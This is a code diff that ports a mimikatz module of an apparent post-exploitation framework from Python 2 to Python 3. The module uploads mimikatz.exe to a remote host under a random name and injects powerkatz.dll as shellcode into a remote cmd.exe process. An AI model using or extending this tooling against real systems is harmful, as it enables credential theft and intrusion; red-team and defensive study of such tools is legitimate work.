@@ -8,6 +8,7 @@ from modules.invoke_ps_module_as import Invoke_ps_module_as
 from modules.inject_dll_srdi import Inject_dll_srdi
 from utils.random_string import random_generator
 import traceback
+import os
 
 
 class MimikatzModuleException(ModuleException):
@@ -104,11 +105,11 @@ class Mimikatz(Module):
         if 'mimikatz.exe' in self._module_settings.keys():
             bin_path = self._module_settings['mimikatz.exe']
         else:
-            exe_path = config.modules_paths + 'exe_modules/mimikatz.exe'
+            exe_path = config.modules_paths + 'exe_modules' + os.sep + 'mimikatz.exe'
             remote_upload_path = self._module_settings['env_directory'] + '\\' + random_generator() + '.exe'
-            print '\n\n\nUploading mimikatz binary....\n'
+            print ('\n\n\nUploading mimikatz binary....\n')
             upload_response = self._parse_response(self.upload_module_object.run([exe_path, remote_upload_path]))
-            print upload_response
+            print (upload_response)
             self._module_settings['mimikatz.exe'] = remote_upload_path
             bin_path = remote_upload_path
         return bin_path
@@ -126,9 +127,9 @@ class Mimikatz(Module):
         dll_name = 'powerkatz.dll'
         exported_function_name = 'powershell_reflective_mimikatz'
         log_file = self._module_settings['env_directory'] + '\\' + random_generator()
-        exported_function_data = str(('"log ' + log_file + '" ' + custom_command + '\x00').encode('utf-16-le'))
+        exported_function_data = str.encode('"log ' + log_file + '" ' + custom_command + '\x00', 'utf-16-le')
         if username == '':
-            print '\n\nInjecting converted DLL shellcode into remote process...'
+            print ('\n\nInjecting converted DLL shellcode into remote process...')
             response = self.inject_dll_srdi_module_object.run([dll_name, 'remote_virtual', 'cmd.exe', '60000', '{}',
                                                                    exported_function_name, exported_function_data])
             response = self._parse_response(response)
